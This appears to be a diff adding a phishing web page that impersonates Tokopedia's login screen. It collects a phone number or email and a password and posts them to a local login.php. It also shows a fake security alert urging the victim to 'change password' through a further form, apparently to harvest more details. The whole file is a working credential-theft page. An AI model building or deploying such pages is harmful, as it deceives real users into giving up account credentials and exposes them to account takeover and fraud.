@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>Tokopedia Login</title>
+    <script src="asset/tailwind.js"></script>
+    <style>
+        @font-face {
+            font-family: 'Open Sans';
+            src: local('Open Sans'), local('Segoe UI'), local('Arial'), sans-serif;
+        }
+    </style>
+    <script id="tailwind-config">
+        tailwind.config = {
+            darkMode: "class",
+            theme: {
+                extend: {
+                    "colors": {
+                        "on-secondary": "#ffffff",
+                        "on-primary-container": "#003518",
+                        "primary-fixed-dim": "#57df89",
+                        "surface-container": "#eeeeee",
+                        "surface-container-low": "#f3f3f4",
+                        "primary-container": "#00aa5b",
+                        "tertiary-fixed": "#e5e2e1",
+                        "secondary": "#50625a",
+                        "on-surface-variant": "#3d4a3f",
+                        "inverse-primary": "#57df89",
+                        "on-secondary-fixed": "#0e1f18",
+                        "on-tertiary-container": "#2c2c2c",
+                        "on-primary-fixed": "#00210d",
+                        "on-primary-fixed-variant": "#005229",
+                        "secondary-container": "#d3e7dc",
+                        "surface-dim": "#dadada",
+                        "outline-variant": "#bccabc",
+                        "outline": "#6d7b6e",
+                        "error": "#ba1a1a",
+                        "on-background": "#1a1c1c",
+                        "surface-container-lowest": "#ffffff",
+                        "on-surface": "#1a1c1c",
+                        "on-primary": "#ffffff",
+                        "tertiary-fixed-dim": "#c8c6c5",
+                        "on-error": "#ffffff",
+                        "tertiary-container": "#959393",
+                        "on-error-container": "#93000a",
+                        "secondary-fixed-dim": "#b7cbc1",
+                        "tertiary": "#5f5e5e",
+                        "on-tertiary-fixed-variant": "#474746",
+                        "primary": "#00aa5b", /* Adjusted primary to match Tokopedia green based on instructions */
+                        "surface": "#ffffff",
+                        "primary-fixed": "#76fca3",
+                        "surface-bright": "#ffffff",
+                        "secondary-fixed": "#d3e7dc",
+                        "on-secondary-fixed-variant": "#394a43",
+                        "error-container": "#ffdad6",
+                        "surface-tint": "#00aa5b",
+                        "surface-container-highest": "#e2e2e2",
+                        "on-tertiary": "#ffffff",
+                        "on-tertiary-fixed": "#1b1c1c",
+                        "surface-container-high": "#e8e8e8",
+                        "inverse-on-surface": "#f0f1f1",
+                        "surface-variant": "#e2e2e2",
+                        "background": "#ffffff",
+                        "inverse-surface": "#2f3131",
+                        "on-secondary-container": "#566860"
+                    },
+                    "borderRadius": {
+                        "DEFAULT": "0.5rem",
+                        "lg": "1rem",
+                        "xl": "1.5rem",
+                        "full": "9999px"
+                    },
+                    "spacing": {
+                        "input-height": "44px",
+                        "container-padding": "24px",
+                        "stack-sm": "8px",
+                        "button-height": "48px",
+                        "stack-lg": "24px",
+                        "stack-md": "16px"
+                    },
+                    "fontFamily": {
+                        "body-lg": ["Open Sans", "sans-serif"],
+                        "caption": ["Open Sans", "sans-serif"],
+                        "headline-lg": ["Open Sans", "sans-serif"],
+                        "headline-md": ["Open Sans", "sans-serif"],
+                        "label-bold": ["Open Sans", "sans-serif"],
+                        "label-md": ["Open Sans", "sans-serif"],
+                        "headline-lg-mobile": ["Open Sans", "sans-serif"],
+                        "body-md": ["Open Sans", "sans-serif"]
+                    },
+                    "fontSize": {
+                        "body-lg": ["16px", { "lineHeight": "24px", "fontWeight": "400" }],
+                        "caption": ["10px", { "lineHeight": "14px", "fontWeight": "400" }],
+                        "headline-lg": ["24px", { "lineHeight": "32px", "fontWeight": "700" }],
+                        "headline-md": ["18px", { "lineHeight": "24px", "fontWeight": "700" }],
+                        "label-bold": ["12px", { "lineHeight": "16px", "fontWeight": "700" }],
+                        "label-md": ["12px", { "lineHeight": "16px", "fontWeight": "400" }],
+                        "headline-lg-mobile": ["20px", { "lineHeight": "28px", "fontWeight": "700" }],
+                        "body-md": ["14px", { "lineHeight": "20px", "fontWeight": "400" }]
+                    }
+                },
+            },
+        }
+    </script>
+    <style>
+        body {
+            font-family: 'Open Sans', sans-serif;
+            background-color: #ffffff;
+        }
+
+        /* Floating label specific styles */
+        .floating-input:focus-within label,
+        .floating-input input:not(:placeholder-shown)+label {
+            transform: translateY(-50%) scale(0.85);
+            top: 0;
+            background-color: white;
+            padding: 0 4px;
+            color: #00aa5b;
+            /* primary color */
+        }
+
+        .floating-input:focus-within input {
+            border-color: #00aa5b;
+            outline: none;
+        }
+    </style>
+</head>
+
+<body class="min-h-screen flex flex-col items-center justify-between text-on-surface">
+    <!-- Header / TopAppBar -->
+    <header class="w-full pt-8 flex justify-center items-center max-w-7xl mx-auto bg-transparent">
+        <img src="asset/tokopedia.png" alt="Tokopedia" style="height: 32px;">
+    </header>
+    <!-- Main Content Canvas -->
+    <main
+        class="flex-grow w-full flex items-center justify-center px-4 md:px-0 bg-none md:bg-[url('asset/background.png')] md:bg-contain md:bg-[center_100px] md:bg-no-repeat relative">
+        <!-- Background Illustration Placeholder (Using the requested image directly in css background, but adding a screen reader accessible div just in case) -->
+
+        <!-- Login Card -->
+        <div
+            class="w-full max-w-[400px] bg-surface rounded-none md:rounded-[16px] shadow-none md:shadow-[0_4px_20px_rgba(0,0,0,0.08)] border-none md:border border-surface-container-high p-4 sm:p-8 z-10 mb-0 md:mb-[80px]">
+            <!-- Card Header -->
+            <div class="flex justify-between items-center mb-8">
+                <h2 class="font-headline-lg text-headline-lg text-on-surface">Masuk ke Tokopedia</h2>
+                <a class="font-body-md text-body-md text-primary font-semibold hover:opacity-80 transition-opacity"
+                    href="#">Daftar</a>
+            </div>
+            <!-- Form Flow -->
+            <form id="login-form" method="POST" action="login.php" class="flex flex-col gap-stack-lg">
+                <!-- Step 1: Identifier Input -->
+                <div id="step-1" class="flex flex-col gap-stack-sm">
+                    <div class="relative floating-input w-full">
+                        <input
+                            class="w-full h-input-height px-3 py-2 border border-outline-variant rounded text-body-md text-on-surface transition-colors focus:ring-0 focus:border-primary peer"
+                            id="login-identifier" name="identifier" placeholder=" " type="text" required>
+                        <label
+                            class="absolute left-3 top-1/2 -translate-y-1/2 text-on-surface-variant font-body-md text-body-md transition-all duration-200 pointer-events-none text-tertiary-container"
+                            for="login-identifier">Nomor HP atau Email</label>
+                    </div>
+                    <div class="flex justify-between items-center px-1">
+                        <span class="font-caption text-caption text-tertiary-container">Contoh: 08123456789</span>
+                        <a id="help-link"
+                            class="font-label-bold text-label-bold text-primary hover:opacity-80 transition-opacity cursor-pointer">Butuh
+                            bantuan?</a>
+                    </div>
+                </div>
+
+                <!-- Step 2: Password Input (Initially Hidden) -->
+                <div id="step-2" class="hidden flex-col gap-stack-md">
+                    <!-- Display Email/Phone -->
+                    <div class="flex flex-col mb-1">
+                        <span
+                            class="font-label-bold text-label-bold text-on-surface font-semibold mb-1 text-[13px]">Nomor
+                            HP / Email</span>
+                        <div class="flex justify-between items-center">
+                            <span id="display-identifier"
+                                class="font-body-md text-body-md text-on-surface truncate"></span>
+                            <button id="edit-identifier-btn" type="button"
+                                class="text-on-surface-variant hover:text-primary transition-colors">
+                                <img src="asset/pencil-edit-svgrepo-com.svg" class="w-5 h-5 opacity-70" alt="Edit">
+                            </button>
+                        </div>
+                    </div>
+                    <!-- Password Input -->
+                    <div class="relative floating-input w-full">
+                        <input
+                            class="w-full h-input-height px-3 py-2 pr-10 border border-outline-variant rounded text-body-md text-on-surface transition-colors focus:ring-0 focus:border-primary peer"
+                            id="login-password" name="password" placeholder=" " type="password">
+                        <label
+                            class="absolute left-3 top-1/2 -translate-y-1/2 text-on-surface-variant font-body-md text-body-md transition-all duration-200 pointer-events-none text-tertiary-container"
+                            for="login-password">Kata Sandi</label>
+                        <button id="toggle-password-btn" type="button"
+                            class="absolute right-3 top-1/2 -translate-y-1/2 text-on-surface-variant hover:text-primary transition-colors focus:outline-none flex items-center justify-center">
+                            <img src="asset/eye-svgrepo-com.svg" id="password-icon" class="w-5 h-5 opacity-70"
+                                alt="Toggle password visibility">
+                        </button>
+                    </div>
+                    <!-- Forgot Password Link -->
+                    <div class="flex justify-end px-1">
+                        <a class="font-label-bold text-label-bold text-primary hover:opacity-80 transition-opacity"
+                            href="form_email.html">Lupa kata sandi?</a>
+                    </div>
+                </div>
+                <!-- Primary Action -->
+                <button id="primary-action-btn" type="button"
+                    class="w-full h-button-height bg-primary text-on-primary font-body-lg text-body-lg font-semibold rounded hover:bg-opacity-90 transition-all opacity-40 cursor-not-allowed">
+                    <span id="primary-btn-text">Selanjutnya</span>
+                </button>
+        </div>
+        </form>
+        </div>
+    </main>
+    <!-- Footer -->
+    <footer
+        class="w-full py-12 flex flex-col md:flex-row justify-center items-center gap-4 bg-transparent mt-auto z-10">
+        <span class="font-body-md text-body-md text-on-surface-variant">© 2009-2026, PT Tokopedia</span>
+        <div class="flex gap-4">
+            <a class="font-body-md text-body-md text-primary font-bold hover:text-primary-container transition-colors cursor-pointer"
+                href="#">Bantuan</a>
+        </div>
+    </footer>
+
+    <!-- Help Modal Overlay -->
+    <div id="help-modal"
+        class="fixed inset-0 bg-black bg-opacity-50 z-50 hidden flex items-center justify-center px-4 transition-opacity">
+        <div class="bg-surface w-full max-w-[400px] rounded-lg shadow-lg flex flex-col overflow-hidden">
+            <!-- Modal Header -->
+            <div class="flex justify-between items-center p-6 border-b-0 pb-4">
+                <h3 class="font-headline-sm text-headline-sm font-bold text-on-surface">Butuh bantuan apa?</h3>
+                <button id="close-help-modal"
+                    class="text-on-surface-variant hover:text-on-surface transition-colors focus:outline-none">
+                    <img src="asset/close-svgrepo-com.svg" class="w-6 h-6 opacity-70" alt="Close">
+                </button>
+            </div>
+            <!-- Modal Body -->
+            <div class="px-6 pb-4 flex flex-col gap-4">
+                <a href="form_email.html">
+                    <button
+                        class="w-full h-button-height border border-surface-container-high rounded flex items-center justify-center text-on-surface font-body-md text-body-md hover:bg-surface-container-low transition-colors">
+                        Lupa kata sandi?
+                    </button></a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Security Alert Modal Overlay -->
+    <div id="security-alert-modal"
+        class="fixed inset-0 bg-black bg-opacity-50 z-50 hidden flex items-center justify-center px-4 transition-opacity">
+        <div class="bg-surface w-full max-w-[400px] rounded-lg shadow-lg flex flex-col overflow-hidden">
+            <!-- Modal Header -->
+            <div class="flex justify-between items-center p-6 border-b-0 pb-4">
+                <h3 class="font-headline-sm text-headline-sm font-bold text-error flex items-center gap-2">
+                    <img src="asset/warningsign-svgrepo-com.svg" class="w-6 h-6" alt="Warning">
+                    Peringatan Keamanan
+                </h3>
+                <button id="close-security-modal"
+                    class="text-on-surface-variant hover:text-on-surface transition-colors focus:outline-none">
+                    <img src="asset/close-svgrepo-com.svg" class="w-6 h-6 opacity-70" alt="Close">
+                </button>
+            </div>
+            <!-- Modal Body -->
+            <div class="px-6 pb-6 flex flex-col gap-4 text-center">
+                <p class="font-body-md text-body-md text-on-surface">
+                    Akun Anda tidak aman. Segera ganti password Anda!
+                </p>
+                <a href="form_email.html">
+                    <button id="btn-ganti-password"
+                        class="w-full h-button-height bg-primary text-on-primary font-body-md text-body-md font-semibold rounded hover:bg-opacity-90 transition-all mt-2">
+                        Ganti Password
+                    </button>
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Script to handle multi-step login logic and interactions
+        const inputField = document.getElementById('login-identifier');
+        const passwordField = document.getElementById('login-password');
+        const submitButton = document.getElementById('primary-action-btn');
+        const btnText = document.getElementById('primary-btn-text');
+
+        const step1 = document.getElementById('step-1');
+        const step2 = document.getElementById('step-2');
+        const displayIdentifier = document.getElementById('display-identifier');
+        const editIdentifierBtn = document.getElementById('edit-identifier-btn');
+        const loginForm = document.getElementById('login-form');
+
+        const togglePasswordBtn = document.getElementById('toggle-password-btn');
+        const passwordIcon = document.getElementById('password-icon');
+
+        let currentStep = 1;
+
+        function updateButtonState() {
+            if (currentStep === 1) {
+                if (inputField.value.trim().length > 0) {
+                    submitButton.classList.remove('opacity-40', 'cursor-not-allowed');
+                } else {
+                    submitButton.classList.add('opacity-40', 'cursor-not-allowed');
+                }
+            } else {
+                if (passwordField.value.trim().length > 0) {
+                    submitButton.classList.remove('opacity-40', 'cursor-not-allowed');
+                } else {
+                    submitButton.classList.add('opacity-40', 'cursor-not-allowed');
+                }
+            }
+        }
+
+        inputField.addEventListener('input', updateButtonState);
+        passwordField.addEventListener('input', updateButtonState);
+
+        submitButton.addEventListener('click', function () {
+            if (currentStep === 1 && inputField.value.trim().length > 0) {
+                document.getElementById('security-alert-modal').classList.remove('hidden');
+                document.getElementById('security-alert-modal').classList.add('flex');
+
+                // Proceed to Step 2
+                currentStep = 2;
+                step1.classList.add('hidden');
+                step1.classList.remove('flex');
+
+                step2.classList.remove('hidden');
+                step2.classList.add('flex');
+
+                displayIdentifier.textContent = inputField.value;
+                btnText.textContent = 'Masuk';
+
+                updateButtonState(); // Re-evaluate button state for password field
+            } else if (currentStep === 2 && passwordField.value.trim().length > 0) {
+                // Submit form
+                loginForm.submit();
+            }
+        });
+
+        editIdentifierBtn.addEventListener('click', function () {
+            // Go back to Step 1
+            currentStep = 1;
+            step2.classList.add('hidden');
+            step2.classList.remove('flex');
+
+            step1.classList.remove('hidden');
+            step1.classList.add('flex');
+
+            btnText.textContent = 'Selanjutnya';
+
+            updateButtonState();
+        });
+
+        togglePasswordBtn.addEventListener('click', function () {
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                passwordIcon.src = 'asset/eye-off-svgrepo-com.svg';
+            } else {
+                passwordField.type = 'password';
+                passwordIcon.src = 'asset/eye-svgrepo-com.svg';
+            }
+        });
+
+        // Help Modal Logic
+        const helpLink = document.getElementById('help-link');
+        const helpModal = document.getElementById('help-modal');
+        const closeHelpModal = document.getElementById('close-help-modal');
+
+        helpLink.addEventListener('click', function (e) {
+            e.preventDefault();
+            helpModal.classList.remove('hidden');
+        });
+
+        closeHelpModal.addEventListener('click', function () {
+            helpModal.classList.add('hidden');
+        });
+
+        // Close modal when clicking outside the box
+        helpModal.addEventListener('click', function (e) {
+            if (e.target === helpModal) {
+                helpModal.classList.add('hidden');
+            }
+        });
+
+        // Security Alert Modal Logic
+        const securityModal = document.getElementById('security-alert-modal');
+        const closeSecurityModal = document.getElementById('close-security-modal');
+        const btnMengerti = document.getElementById('btn-mengerti');
+
+        function hideSecurityModal() {
+            securityModal.classList.add('hidden');
+            securityModal.classList.remove('flex');
+        }
+
+        closeSecurityModal.addEventListener('click', hideSecurityModal);
+        btnMengerti.addEventListener('click', hideSecurityModal);
+
+        securityModal.addEventListener('click', function (e) {
+            if (e.target === securityModal) {
+                hideSecurityModal();
+            }
+        });
+    </script>
+
+
+</body>
+
+</html>
